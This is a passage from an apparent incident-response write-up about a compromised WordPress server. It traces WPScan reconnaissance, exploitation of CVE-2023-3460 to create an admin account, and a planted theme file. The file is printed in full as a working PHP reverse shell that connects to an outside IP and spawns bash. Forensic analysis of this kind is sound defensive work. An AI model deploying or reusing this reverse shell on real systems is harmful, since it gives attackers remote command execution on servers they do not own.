</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root  <span style="color:#bd93f9">111180</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>process<span style="color:#ff79c6">-</span>fd<span style="color:#ff79c6">-</span>links<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">1241355</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>process<span style="color:#ff79c6">-</span>map_files<span style="color:#ff79c6">-</span>link<span style="color:#ff79c6">-</span>hashes<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">3463139</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>process<span style="color:#ff79c6">-</span>map_files<span style="color:#ff79c6">-</span>links<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">11524</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>processes<span style="color:#ff79c6">-</span>axwwSo<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">2991</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>processhashes<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root     <span style="color:#bd93f9">211</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>routetable<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">49785</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>ss<span style="color:#ff79c6">-</span>anepo<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root     <span style="color:#bd93f9">190</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>ssh<span style="color:#ff79c6">-</span>folders<span style="color:#ff79c6">-</span>list<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span>drwxrwxrwx <span style="color:#bd93f9">3</span> root root    <span style="color:#bd93f9">4096</span> May <span style="color:#bd93f9">27</span> <span style="color:#bd93f9">10</span>:<span style="color:#bd93f9">10</span> root
</span></span><span style="display:flex;"><span>drwxrwxrwx <span style="color:#bd93f9">3</span> root root    <span style="color:#bd93f9">4096</span> May <span style="color:#bd93f9">27</span> <span style="color:#bd93f9">10</span>:<span style="color:#bd93f9">10</span> ubuntu
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>System_Info:
</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">340</span>
</span></span><span style="display:flex;"><span>drwxrwxrwx <span style="color:#bd93f9">30</span> root root   <span style="color:#bd93f9">4096</span> May <span style="color:#bd93f9">27</span> <span style="color:#bd93f9">10</span>:<span style="color:#bd93f9">10</span> etc<span style="color:#ff79c6">-</span>modified<span style="color:#ff79c6">-</span>files
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">1968</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>cpuinfo<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root     <span style="color:#bd93f9">76</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>deb<span style="color:#ff79c6">-</span>package<span style="color:#ff79c6">-</span>verify<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">104466</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>deb<span style="color:#ff79c6">-</span>packages<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">1126</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>df<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root  <span style="color:#bd93f9">54667</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>dmesg<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root      <span style="color:#bd93f9">0</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>etc<span style="color:#ff79c6">-</span>key<span style="color:#ff79c6">-</span>files<span style="color:#ff79c6">-</span>list<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">4990</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>etc<span style="color:#ff79c6">-</span>modified<span style="color:#ff79c6">-</span>files<span style="color:#ff79c6">-</span>list<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root     <span style="color:#bd93f9">38</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>host<span style="color:#ff79c6">-</span>date<span style="color:#ff79c6">-</span>timezone<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">1863</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>lsmod<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root      <span style="color:#bd93f9">0</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>lsusb<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">1391</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>meminfo<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">112329</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>modinfo<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">5151</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>module<span style="color:#ff79c6">-</span>sha1<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">4348</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>mount<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">2446</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>procmod<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">526</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>release<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">4570</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>sudo<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User_Files:
</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">8</span>
</span></span><span style="display:flex;"><span>drwxrwxrwx <span style="color:#bd93f9">5</span> root root <span style="color:#bd93f9">4096</span> May <span style="color:#bd93f9">27</span> <span style="color:#bd93f9">10</span>:<span style="color:#bd93f9">10</span> hidden<span style="color:#ff79c6">-</span>user<span style="color:#ff79c6">-</span>home<span style="color:#ff79c6">-</span>dir
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root  <span style="color:#bd93f9">315</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> hidden<span style="color:#ff79c6">-</span>user<span style="color:#ff79c6">-</span>home<span style="color:#ff79c6">-</span>dir<span style="color:#ff79c6">-</span>list<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Virsh:
</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">0</span>
</span></span></code></pre></div><h3 id="tools">Tools</h3>
<ul>
<li>Visual Studio Code</li>
<li>Sublime Text Editor</li>
<li><a href="https://github.com/WithSecureLabs/LinuxCatScale">LinuxCatScale</a> to extract the archive.</li>
</ul>
<h3 id="analysis">Analysis</h3>
<p>The web server was <code>Apache v2.4.41-4ubuntu3.14</code> and it was running <code>WordPress v6.2.2</code> on <code>Ubuntu 20.04.6 LTS (Focal Fossa)</code> with a kernel version of <code>5.15.0-1036-aws</code>.</p>
<p>The server was triaged and we were provided artifacts following the <code>acquisition playbook</code>. Because this was an attack on the webserver most of the analysis for <strong>Initial Foothold</strong> will revolve around analyzing the <code>access.log</code>.</p>
<p>From the access log, we see a lot of HTTP requests coming in and out of the server from an IP <code>23.106.60.163</code> with the user agent <code>WPScan v3.8.24 (https://wpscan.com/wordpress-security-scanner)</code>. The TA used this IP to scan Forella&rsquo;s WordPress blog for vulnerabilities.</p>
<p><code>WPScanner</code> is an automated security auditing tool for WordPress. It scans the WordPress version and its plugins. themes and various other components to check for known vulnerabilities or weaknesses.</p>
<p>The log shows that the TA was successful in identifying a vulnerable plugin. It was <a href="https://ultimatemember.com/">Ultimate-Member - User Profile, Registration, Login, Member Directory, Content Restriction &amp; Membership Plugin</a>, the version that was installed on Forella&rsquo;s WordPress site was <code>v2.6.4</code>.</p>
<p>According to <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-3460">Mitre</a> - <em>The Ultimate Member WordPress plugin before 2.6.7 does not prevent visitors from creating user accounts with arbitrary capabilities, effectively allowing attackers to create administrator accounts at will. This is actively being exploited in the wild.</em> The CVE assigned was <code>CVE-2023-3460</code> with a CVSS (v3.x) base score of <code>9.8 CRITICAL</code>. The exploit for this CVE was publicly available at the time of the attack.</p>
<p>After identifying the vulnerability, the TA used a <a href="https://github.com/gbrsh/CVE-2023-3460">PoC published on GitHub</a> by a security research firm named <a href="https://secragon.com/">Secragon</a>. It was confirmed by analyzing the script&rsquo;s User Agents which were <code>python-requests/2.28.1</code> and <code>Secragon Offensive Agen</code>.</p>
<p>Therefore, successfully creating an admin user named <code>secragon</code> the TA switched his IP to <code>198.16.74.45</code> and manually browsed the admin dashboard. We can confirm this by their User Agent <code>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0</code>.</p>
<p>To get a foothold on the server the TA created a malicious theme, which served as a reverse shell to perform Remote Command Execution. They created the file here <code>/var/www/html/wp-content/themes/twentytwentythree/patterns/hidden-comments.php</code>. The code for the reverse shell is below.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;?php
</span></span><span style="display:flex;"><span>// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
</span></span><span style="display:flex;"><span>// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>set_time_limit (0);
</span></span><span style="display:flex;"><span>$VERSION = &#34;1.0&#34;;
</span></span><span style="display:flex;"><span>$ip = &#39;43.204.24.76&#39;;
</span></span><span style="display:flex;"><span>$port = 6969;
</span></span><span style="display:flex;"><span>$chunk_size = 1400;
</span></span><span style="display:flex;"><span>$write_a = null;
</span></span><span style="display:flex;"><span>$error_a = null;
</span></span><span style="display:flex;"><span>$shell = &#39;uname -a; w; id; /bin/bash -i&#39;;
</span></span><span style="display:flex;"><span>$daemon = 0;
</span></span><span style="display:flex;"><span>$debug = 0;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>if (function_exists(&#39;pcntl_fork&#39;)) {
</span></span><span style="display:flex;"><span>	$pid = pcntl_fork();
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	if ($pid == -1) {
</span></span><span style="display:flex;"><span>		printit(&#34;ERROR: Can&#39;t fork&#34;);
</span></span><span style="display:flex;"><span>		exit(1);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	if ($pid) {
</span></span><span style="display:flex;"><span>		exit(0);  // Parent exits
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	if (posix_setsid() == -1) {
</span></span><span style="display:flex;"><span>		printit(&#34;Error: Can&#39;t setsid()&#34;);
</span></span><span style="display:flex;"><span>		exit(1);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	$daemon = 1;
</span></span><span style="display:flex;"><span>} else {
</span></span><span style="display:flex;"><span>	printit(&#34;WARNING: Failed to daemonise.  This is quite common and not fatal.&#34;);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>chdir(&#34;/&#34;);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>umask(0);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>// Open reverse connection
</span></span><span style="display:flex;"><span>$sock = fsockopen($ip, $port, $errno, $errstr, 30);
</span></span><span style="display:flex;"><span>if (!$sock) {
</span></span><span style="display:flex;"><span>	printit(&#34;$errstr ($errno)&#34;);
</span></span><span style="display:flex;"><span>	exit(1);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$descriptorspec = array(
</span></span><span style="display:flex;"><span>   0 =&gt; array(&#34;pipe&#34;, &#34;r&#34;),  // stdin is a pipe that the child will read from
</span></span><span style="display:flex;"><span>   1 =&gt; array(&#34;pipe&#34;, &#34;w&#34;),  // stdout is a pipe that the child will write to
</span></span><span style="display:flex;"><span>   2 =&gt; array(&#34;pipe&#34;, &#34;w&#34;)   // stderr is a pipe that the child will write to
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$process = proc_open($shell, $descriptorspec, $pipes);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>if (!is_resource($process)) {
</span></span><span style="display:flex;"><span>	printit(&#34;ERROR: Can&#39;t spawn shell&#34;);
</span></span><span style="display:flex;"><span>	exit(1);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>stream_set_blocking($pipes[0], 0);
</span></span><span style="display:flex;"><span>stream_set_blocking($pipes[1], 0);
</span></span><span style="display:flex;"><span>stream_set_blocking($pipes[2], 0);
</span></span><span style="display:flex;"><span>stream_set_blocking($sock, 0);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>printit(&#34;Successfully opened reverse shell to $ip:$port&#34;);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>while (1) {
</span></span><span style="display:flex;"><span>	if (feof($sock)) {
</span></span><span style="display:flex;"><span>		printit(&#34;ERROR: Shell connection terminated&#34;);
</span></span><span style="display:flex;"><span>		break;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	if (feof($pipes[1])) {
</span></span><span style="display:flex;"><span>		printit(&#34;ERROR: Shell process terminated&#34;);
</span></span><span style="display:flex;"><span>		break;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	$read_a = array($sock, $pipes[1], $pipes[2]);
</span></span><span style="display:flex;"><span>	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	if (in_array($sock, $read_a)) {
</span></span><span style="display:flex;"><span>		if ($debug) printit(&#34;SOCK READ&#34;);
</span></span><span style="display:flex;"><span>		$input = fread($sock, $chunk_size);
</span></span><span style="display:flex;"><span>		if ($debug) printit(&#34;SOCK: $input&#34;);
</span></span><span style="display:flex;"><span>		fwrite($pipes[0], $input);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	if (in_array($pipes[1], $read_a)) {
</span></span><span style="display:flex;"><span>		if ($debug) printit(&#34;STDOUT READ&#34;);
</span></span><span style="display:flex;"><span>		$input = fread($pipes[1], $chunk_size);
</span></span><span style="display:flex;"><span>		if ($debug) printit(&#34;STDOUT: $input&#34;);
</span></span><span style="display:flex;"><span>		fwrite($sock, $input);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	if (in_array($pipes[2], $read_a)) {
</span></span><span style="display:flex;"><span>		if ($debug) printit(&#34;STDERR READ&#34;);
</span></span><span style="display:flex;"><span>		$input = fread($pipes[2], $chunk_size);
</span></span><span style="display:flex;"><span>		if ($debug) printit(&#34;STDERR: $input&#34;);
</span></span><span style="display:flex;"><span>		fwrite($sock, $input);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>fclose($sock);
